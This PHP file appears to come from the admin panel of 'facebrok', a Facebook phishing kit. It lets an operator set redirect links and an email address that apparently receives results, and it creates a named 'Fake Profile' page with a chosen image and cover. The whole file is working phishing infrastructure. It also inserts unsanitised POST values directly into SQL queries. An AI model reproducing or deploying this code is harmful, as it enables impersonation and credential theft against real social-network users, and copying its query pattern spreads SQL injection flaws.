<?php
// facebrok 
// method, operations.
session_start();
error_reporting(0);
if($_SESSION['user']){
include ("config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS)          or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB)                          or die ('Failed in Databases: '.mysql_error());
$id=$_POST['id'];
$link=$_POST['link'];
$pro="";
$linl="";
$email=$_POST['email'];
mysql_query("SELECT * FROM methods WHERE id=$id")  or die(header("location: templates"));
if ($id==7){mysql_query("UPDATE methods SET other='$email' WHERE id=2");}
if ($id==1){mysql_query("UPDATE methods SET value='$link' WHERE  id=1");}
if ($id==2){mysql_query("UPDATE methods SET value='$link' WHERE  id=2");}
if ($id==3){
	if($link=="On"){mysql_query("UPDATE methods SET other=1 WHERE id=3");}
	if($link=="Off"){mysql_query("UPDATE methods SET other=0 WHERE id=3");}
	if($link!="On" and $link !="Off"){mysql_query("UPDATE methods SET value='$link' WHERE id=3");}}
if ($id==4){
$img=$_POST['img'];
$name=$_POST['name'];
$wall=$_POST['cover'];
$names=str_replace(" ","",$name);

if (file_exists("../profile.php")) {
rename('../profile.php','../'.$names.'.php'); }
 else 
{
$sql=mysql_query("SELECT * FROM methods WHERE id=4") or die(header("location: templates"));
$row=mysql_fetch_array($sql);
$namev=''.$row['method'].''; 
$namet=str_replace(" ","",$namev);
rename('../'.$namet.'.php','../'.$names.'.php');
}
$pro="You Fake Profile: <span style=\"color:white\">".$name."";
$linl="../".$names."";
mysql_query("SELECT * FROM methods WHERE id=4") or die(header("location: templates"));
mysql_query("UPDATE methods SET method='$name' WHERE id=4");
mysql_query("UPDATE methods SET value='$img' WHERE id=4");
mysql_query("UPDATE methods SET other='$wall' WHERE id=4");
?>
<a href="<?php echo "$linl";?>" target="_blank" class="btn purple pull-right"><?php echo "$pro";?></a>
<?php }} else {header("location:../croak");} ?>
